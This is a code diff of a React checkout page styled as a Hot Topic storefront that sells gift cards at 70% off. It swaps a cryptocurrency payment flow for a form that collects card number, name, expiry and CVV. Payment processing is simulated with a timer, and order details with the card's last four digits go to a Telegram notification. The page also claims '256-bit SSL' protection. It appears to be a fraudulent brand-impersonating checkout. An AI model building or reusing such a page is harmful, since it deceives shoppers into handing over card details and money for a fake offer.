@@ -1,406 +1,428 @@
 
-import { useEffect, useState } from "react";
+import { useState } from "react";
 import { useLocation, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
+import { Input } from "@/components/ui/input";
+import { Label } from "@/components/ui/label";
 import { toast } from "@/hooks/use-toast";
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import HotTopicHeader from "@/components/HotTopicHeader";
 import HotTopicFooter from "@/components/HotTopicFooter";
-import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
-import { CoinPaymentTransaction, getCoinPaymentStatus, PAYMENT_STATUS, SUPPORTED_CRYPTOCURRENCIES } from "@/integrations/coinpayments/client";
-import { AlertCircle, Copy, QrCode, Wallet } from "lucide-react";
+import { AlertCircle, CreditCard, LockIcon, Shield } from "lucide-react";
+import { supabase } from "@/integrations/supabase/client";
+
+const CARD_TYPES = [
+  { name: "Visa", image: "https://i.imgur.com/Ames4RX.png" },
+  { name: "Mastercard", image: "https://i.imgur.com/bCBB4IZ.png" },
+  { name: "American Express", image: "https://i.imgur.com/MsEDvx2.png" },
+  { name: "Discover", image: "https://i.imgur.com/o3VHRg1.png" }
+];
+
+// Regex patterns for validation
+const CARD_NUMBER_REGEX = /^[0-9]{13,19}$/;
+const CVV_REGEX = /^[0-9]{3,4}$/;
 
 const Payment = () => {
   const location = useLocation();
   const navigate = useNavigate();
-  const [transaction, setTransaction] = useState<CoinPaymentTransaction | null>(null);
-  const [statusCheckInterval, setStatusCheckInterval] = useState<number | null>(null);
-  const [timeLeft, setTimeLeft] = useState<number | null>(null);
-  const [loading, setLoading] = useState(false);
-  const [paymentStatus, setPaymentStatus] = useState<{
-    statusCode: number;
-    statusText: string;
-  } | null>(null);
-  const [showInfoDialog, setShowInfoDialog] = useState(false);
+  const [selectedCardType, setSelectedCardType] = useState<string>("Visa");
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [formData, setFormData] = useState({
+    cardNumber: "",
+    cardName: "",
+    expiryDate: "",
+    cvv: ""
+  });
+  const [errors, setErrors] = useState<Record<string, string>>({});
 
-  // Get transaction details from location state
-  useEffect(() => {
-    const txnDetails = location.state?.transactionDetails;
-    if (txnDetails) {
-      setTransaction(txnDetails);
-      
-      // Calculate time left in minutes
-      if (txnDetails.timeout) {
-        const expiryTimeInMinutes = Math.floor(txnDetails.timeout / 60);
-        setTimeLeft(expiryTimeInMinutes);
-      }
+  // Get order details from location state
+  const orderDetails = location.state?.orderDetails;
+  const giftCardValue = location.state?.giftCardValue;
+  const discountedAmount = location.state?.discountedAmount;
+
+  // If no order details, redirect to home
+  if (!orderDetails) {
+    navigate("/");
+    toast({
+      title: "Error",
+      description: "No order information found. Please start again.",
+      variant: "destructive",
+    });
+  }
+
+  const validateField = (name: string, value: string): string => {
+    switch (name) {
+      case "cardName":
+        return value.trim() === "" ? "This field is required" : "";
+      case "cardNumber":
+        return !CARD_NUMBER_REGEX.test(value.replace(/\s/g, '')) ? "Please enter a valid card number" : "";
+      case "expiryDate":
+        const [month, year] = value.split('/').map(part => part.trim());
+        if (!month || !year || isNaN(Number(month)) || isNaN(Number(year))) {
+          return "Please enter a valid expiry date (MM/YY)";
+        }
+        if (Number(month) < 1 || Number(month) > 12) {
+          return "Month must be between 1 and 12";
+        }
+        const currentYear = new Date().getFullYear() % 100;
+        if (Number(year) < currentYear) {
+          return "Card has expired";
+        }
+        return "";
+      case "cvv":
+        return !CVV_REGEX.test(value) ? "Please enter a valid CVV" : "";
+      default:
+        return "";
+    }
+  };
+
+  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const { name, value } = e.target;
+    setFormData((prev) => ({ ...prev, [name]: value }));
+    
+    // Validate field on change and update errors
+    const error = validateField(name, value);
+    setErrors(prev => ({
+      ...prev,
+      [name]: error
+    }));
+  };
+
+  const formatCardNumber = (value: string): string => {
+    // Remove all non-digit characters
+    const cleaned = value.replace(/\D/g, '');
+    
+    // Format as XXXX XXXX XXXX XXXX
+    const chunks = [];
+    for (let i = 0; i < cleaned.length; i += 4) {
+      chunks.push(cleaned.substring(i, i + 4));
+    }
+    return chunks.join(' ');
+  };
+
+  const formatExpiryDate = (value: string): string => {
+    // Remove all non-digit characters
+    const cleaned = value.replace(/\D/g, '');
+    
+    // Format as MM/YY
+    if (cleaned.length >= 3) {
+      return `${cleaned.substring(0, 2)}/${cleaned.substring(2, 4)}`;
     } else {
-      // If no transaction details, redirect to home
+      return cleaned;
+    }
+  };
+
+  const handleCardNumberInput = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const formatted = formatCardNumber(e.target.value);
+    setFormData(prev => ({
+      ...prev,
+      cardNumber: formatted
+    }));
+    
+    // Validate card number
+    const error = validateField("cardNumber", formatted);
+    setErrors(prev => ({
+      ...prev,
+      cardNumber: error
+    }));
+  };
+
+  const handleExpiryDateInput = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const formatted = formatExpiryDate(e.target.value);
+    setFormData(prev => ({
+      ...prev,
+      expiryDate: formatted
+    }));
+    
+    // Validate expiry date
+    const error = validateField("expiryDate", formatted);
+    setErrors(prev => ({
+      ...prev,
+      expiryDate: error
+    }));
+  };
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    
+    // Validate all required fields
+    const newErrors: Record<string, string> = {};
+    let hasErrors = false;
+    
+    // Fields to validate
+    const fieldNames = ["cardNumber", "cardName", "expiryDate", "cvv"];
+    
+    // Validate each field
+    fieldNames.forEach(fieldName => {
+      const error = validateField(fieldName, formData[fieldName as keyof typeof formData]);
+      if (error) {
+        newErrors[fieldName] = error;
+        hasErrors = true;
+      }
+    });
+    
+    setErrors(newErrors);
+    
+    if (hasErrors) {
       toast({
-        title: "Error",
-        description: "No payment information found.",
+        title: "Validation Error",
+        description: "Please fix the errors in the form",
         variant: "destructive",
       });
-      navigate("/");
+      return;
     }
-  }, [location, navigate]);
-
-  // Set up status check interval
-  useEffect(() => {
-    if (transaction?.txn_id) {
-      // Initial status check
-      checkPaymentStatus();
-      
-      // Set up interval to check status every 30 seconds
-      const intervalId = window.setInterval(() => {
-        checkPaymentStatus();
-      }, 30000);
-      
-      setStatusCheckInterval(intervalId);
-      
-      // Countdown timer
-      const countdownId = window.setInterval(() => {
-        setTimeLeft((prev) => {
-          if (prev === null || prev <= 0) {
-            clearInterval(countdownId);
-            return 0;
-          }
-          return prev - 0.5;
-        });
-      }, 30000);
-      
-      // Cleanup on component unmount
-      return () => {
-        if (statusCheckInterval) window.clearInterval(statusCheckInterval);
-        window.clearInterval(countdownId);
-      };
-    }
-  }, [transaction?.txn_id]);
-
-  // Check payment status
-  const checkPaymentStatus = async () => {
-    if (!transaction?.txn_id) return;
     
-    setLoading(true);
+    // Set loading state
+    setIsSubmitting(true);
     
     try {
-      const result = await getCoinPaymentStatus(transaction.txn_id);
+      console.log(`Processing payment for $${giftCardValue} gift card (70% off) using ${selectedCardType}`);
       
-      if (result.success && result.statusCode !== undefined) {
-        setPaymentStatus({
-          statusCode: result.statusCode,
-          statusText: result.status || "Unknown",
-        });
+      // Create payment processing simulation
+      setTimeout(() => {
+        // Create order details object with payment info
+        const completeOrderDetails = {
+          ...orderDetails,
+          paymentMethod: selectedCardType,
+          lastFour: formData.cardNumber.slice(-4)
+        };
+  
+        // Save order details to localStorage for reference
+        localStorage.setItem("hotTopicOrder", JSON.stringify(completeOrderDetails));
         
-        // If payment is confirmed or completed, redirect to success page
-        if (
-          result.statusCode === PAYMENT_STATUS.CONFIRMED || 
-          result.statusCode === PAYMENT_STATUS.COMPLETE
-        ) {
-          if (statusCheckInterval) window.clearInterval(statusCheckInterval);
-          toast({
-            title: "Payment Successful",
-            description: "Your payment has been received and confirmed!",
+        // Send order notification to Telegram
+        try {
+          console.log("Sending order notification to Telegram with details:", completeOrderDetails);
+          supabase.functions.invoke("send-telegram-notification", {
+            body: completeOrderDetails
+          }).then(response => {
+            if (response.error) {
+              console.error("Failed to send Telegram notification:", response.error);
+            } else {
+              console.log("Telegram notification sent successfully:", response.data);
+            }
           });
-          navigate("/payment-success", { state: { txnId: transaction.txn_id } });
+        } catch (telegramErr) {
+          console.error("Error sending Telegram notification:", telegramErr);
         }
         
-        // If payment is expired or cancelled, redirect to cancelled page
-        if (result.statusCode === PAYMENT_STATUS.EXPIRED) {
-          if (statusCheckInterval) window.clearInterval(statusCheckInterval);
-          toast({
-            title: "Payment Expired",
-            description: "Your payment has expired or been cancelled.",
-            variant: "destructive",
-          });
-          navigate("/payment-cancelled");
-        }
-      } else if (result.error) {
-        console.error("Payment status check failed:", result.error);
-        toast({
-          title: "Status Check Failed",
-          description: result.error,
-          variant: "destructive",
+        // Navigate to payment success page
+        navigate("/payment-success", { 
+          state: { 
+            orderDetails: completeOrderDetails,
+            giftCardValue,
+            discountedAmount
+          } 
         });
-      }
+      }, 2500);
     } catch (error) {
-      console.error("Payment status check error:", error);
+      console.error("Payment submission error:", error);
       toast({
-        title: "Status Check Error",
-        description: "An unexpected error occurred while checking payment status.",
+        title: "System Error",
+        description: "We encountered a technical issue. Please try again later.",
         variant: "destructive",
       });
-    } finally {
-      setLoading(false);
+      setIsSubmitting(false);
     }
   };
 
-  // Copy address to clipboard
-  const copyAddressToClipboard = () => {
-    if (transaction?.address) {
-      navigator.clipboard.writeText(transaction.address);
-      toast({
-        title: "Address Copied",
-        description: "Cryptocurrency address copied to clipboard",
-      });
-    }
-  };
-
-  // Get cryptocurrency details
-  const getCryptoCurrency = () => {
-    if (!transaction) return null;
+  const renderErrorMessage = (fieldName: string) => {
+    if (!errors[fieldName]) return null;
     
-    // Extract currency code from the transaction
-    // The address is for the specific cryptocurrency, so we can determine the currency from the transaction
-    const currencyCode = location.state?.cryptoCurrency || "BTC";
-    
-    return SUPPORTED_CRYPTOCURRENCIES.find(c => c.code === currencyCode) || {
-      code: currencyCode,
-      name: currencyCode,
-      logo: null
-    };
-  };
-  
-  const cryptoCurrency = getCryptoCurrency();
-
-  // Render loading state
-  if (!transaction) {
     return (
-      <div className="min-h-screen bg-black">
-        <HotTopicHeader />
-        <div className="container py-12 flex justify-center items-center">
-          <div className="text-white text-center">
-            <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-hottopic-red mx-auto mb-4"></div>
-            <p>Loading payment details...</p>
-          </div>
-        </div>
-        <HotTopicFooter />
+      <div className="text-red-500 text-sm mt-1 flex items-center gap-1">
+        <AlertCircle className="h-4 w-4" />
+        <span>{errors[fieldName]}</span>
       </div>
     );
-  }
+  };
 
   return (
     <div className="min-h-screen bg-black">
       <HotTopicHeader />
       
       <div className="container py-8">
-        <div className="max-w-3xl mx-auto bg-hottopic-gray/10 rounded-xl p-6 border border-hottopic-gray/20 shadow-lg">
-          <div className="text-center mb-6">
-            <h1 className="text-3xl font-bold text-white mb-2">Complete Your Payment</h1>
-            <p className="text-gray-300">
-              Pay with {cryptoCurrency?.name || "cryptocurrency"} to receive your Hot Topic gift card
-            </p>
-          </div>
-          
-          {/* Payment Status Banner */}
-          <div className={`mb-6 p-4 rounded-lg border ${
-            paymentStatus?.statusCode === PAYMENT_STATUS.CONFIRMED 
-            ? "bg-green-900/20 border-green-600/30 text-green-400" 
-            : "bg-yellow-900/20 border-yellow-600/30 text-yellow-400"
-          }`}>
-            <div className="flex items-center justify-center gap-2">
-              <div className={`w-3 h-3 rounded-full ${
-                paymentStatus?.statusCode === PAYMENT_STATUS.CONFIRMED 
-                ? "bg-green-400 animate-pulse" 
-                : "bg-yellow-400 animate-pulse"
-              }`}></div>
-              <span className="font-medium">
-                {paymentStatus?.statusText || "Waiting for Payment"}
-              </span>
-            </div>
-          </div>
-          
-          <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
-            {/* QR Code Section */}
-            <div className="flex flex-col items-center">
-              <div className="bg-white p-4 rounded-lg shadow-lg mb-4">
-                {transaction.qrcode_url ? (
-                  <img 
-                    src={transaction.qrcode_url} 
-                    alt="Payment QR Code" 
-                    className="w-64 h-64 object-contain"
-                    onError={(e) => {
-                      e.currentTarget.src = "https://placehold.co/400x400/black/white?text=QR+Code+Unavailable";
-                    }}
-                  />
-                ) : (
-                  <div className="w-64 h-64 flex items-center justify-center bg-gray-100">
-                    <QrCode size={64} className="text-gray-400" />
-                    <span className="text-gray-400">QR Code Unavailable</span>
-                  </div>
-                )}
-              </div>
-              <p className="text-sm text-gray-400 text-center mb-4">
-                Scan this QR code with your {cryptoCurrency?.name || "cryptocurrency"} wallet
-              </p>
-              
-              <div className="flex flex-col items-center w-full">
-                <Button
-                  variant="outline"
-                  onClick={checkPaymentStatus}
-                  disabled={loading}
-                  className="mb-2 border-hottopic-gray text-white hover:bg-hottopic-gray/20 w-full sm:w-auto"
-                >
-                  {loading ? "Checking..." : "Check Payment Status"}
-                </Button>
-                
-                <Button 
-                  variant="link" 
-                  onClick={() => setShowInfoDialog(true)}
-                  className="text-hottopic-red"
-                >
-                  Need help with payment?
-                </Button>
-              </div>
-            </div>
+        <div className="max-w-3xl mx-auto space-y-6">
+          <div className="bg-hottopic-gray/10 rounded-xl p-6 border border-hottopic-gray/20">
+            <h1 className="text-3xl font-bold text-white mb-6 text-center">
+              Complete Your <span className="text-hottopic-red">Payment</span>
+            </h1>
             
-            {/* Payment Details Section */}
-            <div className="flex flex-col">
-              <div className="bg-hottopic-gray/20 p-6 rounded-lg border border-hottopic-gray/30 mb-4">
-                <h3 className="text-xl font-semibold text-white mb-4 flex items-center">
-                  <Wallet className="mr-2 text-hottopic-red" size={20} />
-                  Payment Instructions
-                </h3>
+            <form onSubmit={handleSubmit} className="space-y-6">
+              {/* Payment Method */}
+              <div className="space-y-4">
+                <h2 className="text-2xl font-semibold text-white flex items-center mb-4">
+                  <span className="bg-hottopic-red w-8 h-8 rounded-full flex items-center justify-center mr-2 text-white">
+                    1
+                  </span>
+                  Payment Method
+                </h2>
                 
-                <div className="space-y-4">
-                  {/* Amount */}
-                  <div>
-                    <p className="text-gray-400 text-sm mb-1">Send exactly:</p>
-                    <div className="font-bold text-2xl text-white">
-                      {transaction.amount} {cryptoCurrency?.code || ""}
-                    </div>
-                  </div>
-                  
-                  {/* Address */}
-                  <div>
-                    <p className="text-gray-400 text-sm mb-1">To this address:</p>
-                    <div className="flex items-center bg-hottopic-gray/30 border border-hottopic-gray/40 rounded p-2 gap-2">
-                      <div className="text-sm text-white break-all font-mono flex-1">
-                        {transaction.address}
-                      </div>
-                      <Button 
-                        variant="ghost" 
-                        size="sm" 
-                        onClick={copyAddressToClipboard}
-                        className="hover:bg-hottopic-gray/20"
+                <div className="space-y-2">
+                  <Label htmlFor="cardType" className="text-white">Card Type*</Label>
+                  <div className="flex items-center gap-2">
+                    <CreditCard className="h-5 w-5 text-hottopic-red" />
+                    <Select
+                      value={selectedCardType}
+                      onValueChange={(value) => setSelectedCardType(value)}
+                    >
+                      <SelectTrigger 
+                        className="bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red w-full sm:w-auto"
+                        id="cardType"
                       >
-                        <Copy size={16} className="text-hottopic-red" />
-                      </Button>
-                    </div>
+                        <SelectValue placeholder="Select card type" />
+                      </SelectTrigger>
+                      <SelectContent className="bg-hottopic-dark border-hottopic-gray">
+                        {CARD_TYPES.map((card) => (
+                          <SelectItem 
+                            key={card.name} 
+                            value={card.name}
+                            className="text-white hover:bg-hottopic-gray/30 focus:bg-hottopic-gray/30"
+                          >
+                            <div className="flex items-center gap-2">
+                              <img src={card.image} alt={card.name} className="w-8 h-auto" /> 
+                              {card.name}
+                            </div>
+                          </SelectItem>
+                        ))}
+                      </SelectContent>
+                    </Select>
                   </div>
-                  
-                  {/* Time Remaining */}
-                  <div>
-                    <p className="text-gray-400 text-sm mb-1">Time remaining:</p>
-                    <div className="font-semibold text-white">
-                      {timeLeft !== null && timeLeft > 0 
-                        ? `${Math.ceil(timeLeft)} minutes`
-                        : "Payment expired"}
+                </div>
+              </div>
+              
+              {/* Card Details */}
+              <div className="space-y-4">
+                <h2 className="text-2xl font-semibold text-white flex items-center mb-4">
+                  <span className="bg-hottopic-red w-8 h-8 rounded-full flex items-center justify-center mr-2 text-white">
+                    2
+                  </span>
+                  Card Details
+                </h2>
+                
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <div className="space-y-2">
+                    <Label htmlFor="cardNumber" className="text-white">Card Number*</Label>
+                    <div className="relative">
+                      <Input
+                        id="cardNumber"
+                        name="cardNumber"
+                        value={formData.cardNumber}
+                        onChange={handleCardNumberInput}
+                        className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red pl-9 font-mono ${errors.cardNumber ? 'border-red-500' : ''}`}
+                        placeholder="•••• •••• •••• ••••"
+                        maxLength={19}
+                      />
+                      <CreditCard className="absolute left-3 top-2.5 h-4 w-4 text-gray-400" />
                     </div>
+                    {renderErrorMessage("cardNumber")}
                   </div>
-                  
-                  {/* Confirmations */}
-                  <div>
-                    <p className="text-gray-400 text-sm mb-1">Required confirmations:</p>
-                    <div className="font-semibold text-white">
-                      {transaction.confirms_needed} network confirmations
+                  <div className="space-y-2">
+                    <Label htmlFor="cardName" className="text-white">Name on Card*</Label>
+                    <Input
+                      id="cardName"
+                      name="cardName"
+                      value={formData.cardName}
+                      onChange={handleInputChange}
+                      className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.cardName ? 'border-red-500' : ''}`}
+                      placeholder="Enter name as it appears on card"
+                    />
+                    {renderErrorMessage("cardName")}
+                  </div>
+                </div>
+                
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <div className="space-y-2">
+                    <Label htmlFor="expiryDate" className="text-white">Expiry Date*</Label>
+                    <Input
+                      id="expiryDate"
+                      name="expiryDate"
+                      value={formData.expiryDate}
+                      onChange={handleExpiryDateInput}
+                      className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.expiryDate ? 'border-red-500' : ''}`}
+                      placeholder="MM/YY"
+                      maxLength={5}
+                    />
+                    {renderErrorMessage("expiryDate")}
+                  </div>
+                  <div className="space-y-2">
+                    <Label htmlFor="cvv" className="text-white">Security Code (CVV)*</Label>
+                    <div className="relative">
+                      <Input
+                        id="cvv"
+                        name="cvv"
+                        value={formData.cvv}
+                        onChange={handleInputChange}
+                        className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.cvv ? 'border-red-500' : ''}`}
+                        placeholder="•••"
+                        maxLength={4}
+                        type="password"
+                      />
+                      <div className="absolute right-3 top-2.5 h-4 w-4 text-gray-400">
+                        <LockIcon size={16} />
+                      </div>
                     </div>
+                    {renderErrorMessage("cvv")}
                   </div>
                 </div>
               </div>
               
               {/* Order Summary */}
-              <div className="bg-hottopic-gray/20 p-6 rounded-lg border border-hottopic-gray/30">
-                <h3 className="text-lg font-semibold text-white mb-3 border-b border-hottopic-gray/30 pb-2">
-                  Order Summary
-                </h3>
+              <div className="bg-hottopic-gray/20 p-6 rounded-lg border border-hottopic-gray/30 space-y-4">
+                <h3 className="text-xl font-semibold text-white mb-2">Order Summary</h3>
                 
                 <div className="space-y-2 text-sm">
                   <div className="flex justify-between">
                     <span className="text-gray-400">Item:</span>
-                    <span className="text-white">{location.state?.itemName || "Hot Topic Gift Card"}</span>
+                    <span className="text-white">Hot Topic Gift Card</span>
                   </div>
                   <div className="flex justify-between">
                     <span className="text-gray-400">Gift Card Value:</span>
-                    <span className="text-white">${location.state?.giftCardValue?.toFixed(2) || "0.00"}</span>
+                    <span className="text-white">${giftCardValue?.toFixed(2) || "0.00"}</span>
                   </div>
                   <div className="flex justify-between">
                     <span className="text-gray-400">Discount:</span>
-                    <span className="text-hottopic-red">50% OFF</span>
+                    <span className="text-hottopic-red">70% OFF</span>
                   </div>
                   <div className="flex justify-between">
-                    <span className="text-gray-400">Payment Method:</span>
-                    <div className="flex items-center">
-                      {cryptoCurrency?.logo && (
-                        <img 
-                          src={cryptoCurrency.logo} 
-                          alt={cryptoCurrency.name} 
-                          className="w-4 h-4 mr-1"
-                          onError={(e) => {
-                            e.currentTarget.style.display = 'none';
-                          }}
-                        />
-                      )}
-                      <span className="text-white">{cryptoCurrency?.name || "Cryptocurrency"}</span>
-                    </div>
+                    <span className="text-gray-400">Delivery Method:</span>
+                    <span className="text-white capitalize">{orderDetails?.deliveryMethod}</span>
                   </div>
                   <div className="border-t border-hottopic-gray/30 my-2 pt-2 flex justify-between font-bold">
                     <span className="text-white">Total:</span>
-                    <span className="text-hottopic-red">${location.state?.amount?.toFixed(2) || "0.00"}</span>
+                    <span className="text-hottopic-red">${discountedAmount?.toFixed(2) || "0.00"}</span>
                   </div>
                 </div>
-                
-                <div className="mt-4 text-xs text-gray-400 flex items-center">
-                  <AlertCircle size={12} className="mr-1 text-gray-400" />
-                  Transaction ID: {transaction.txn_id?.substring(0, 12)}...
-                </div>
               </div>
-            </div>
-          </div>
-          
-          <div className="mt-8 flex justify-center space-x-4">
-            <Button
-              variant="outline"
-              onClick={() => window.open(transaction.status_url, '_blank')}
-              className="border-hottopic-gray text-white hover:bg-hottopic-gray/20"
-            >
-              View on CoinPayments
-            </Button>
-            <Button
-              variant="default"
-              onClick={() => navigate('/')}
-              className="bg-hottopic-red hover:bg-hottopic-red/90"
-            >
-              Return to Home
-            </Button>
+              
+              {/* Submit Button */}
+              <div className="flex justify-center">
+                <Button 
+                  type="submit" 
+                  disabled={isSubmitting}
+                  className="w-full md:w-auto px-8 py-6 bg-hottopic-red hover:bg-hottopic-red/90 text-white font-bold text-lg"
+                >
+                  {isSubmitting ? (
+                    <div className="flex items-center space-x-2">
+                      <div className="w-5 h-5 border-2 border-t-transparent border-white rounded-full animate-spin"></div>
+                      <span>Processing...</span>
+                    </div>
+                  ) : (
+                    "Complete Purchase"
+                  )}
+                </Button>
+              </div>
+              
+              <div className="flex items-center justify-center text-center">
+                <Shield size={16} className="text-gray-400 mr-2" />
+                <p className="text-gray-400 text-sm">
+                  Secure checkout - Your information is protected with 256-bit SSL encryption
+                </p>
+              </div>
+            </form>
           </div>
         </div>
       </div>
-      
-      {/* Help Dialog */}
-      <Dialog open={showInfoDialog} onOpenChange={setShowInfoDialog}>
-        <DialogContent className="bg-hottopic-dark border-hottopic-gray text-white">
-          <DialogHeader>
-            <DialogTitle className="text-xl text-white">How to Pay with {cryptoCurrency?.name || "Cryptocurrency"}</DialogTitle>
-          </DialogHeader>
-          <div className="space-y-4">
-            <p>Follow these steps to complete your payment:</p>
-            <ol className="list-decimal pl-5 space-y-2">
-              <li>Open your {cryptoCurrency?.name || "cryptocurrency"} wallet app</li>
-              <li>Scan the QR code or copy the payment address</li>
-              <li>Send <strong>exactly</strong> {transaction.amount} {cryptoCurrency?.code || ""}</li>
-              <li>Wait for the network confirmations ({transaction.confirms_needed} required)</li>
-              <li>Once confirmed, your payment will be automatically processed</li>
-              <li>You'll receive your Hot Topic gift card details shortly after</li>
-            </ol>
-            <div className="bg-yellow-900/20 border border-yellow-600/30 text-yellow-400 p-3 rounded-md mt-4">
-              <p className="text-sm flex items-center">
-                <AlertCircle size={16} className="mr-2" />
-                Payment must be completed within {Math.ceil(timeLeft || 0)} minutes or it will expire.
-              </p>
-            </div>
-          </div>
-        </DialogContent>
-      </Dialog>
       
       <HotTopicFooter />
     </div>
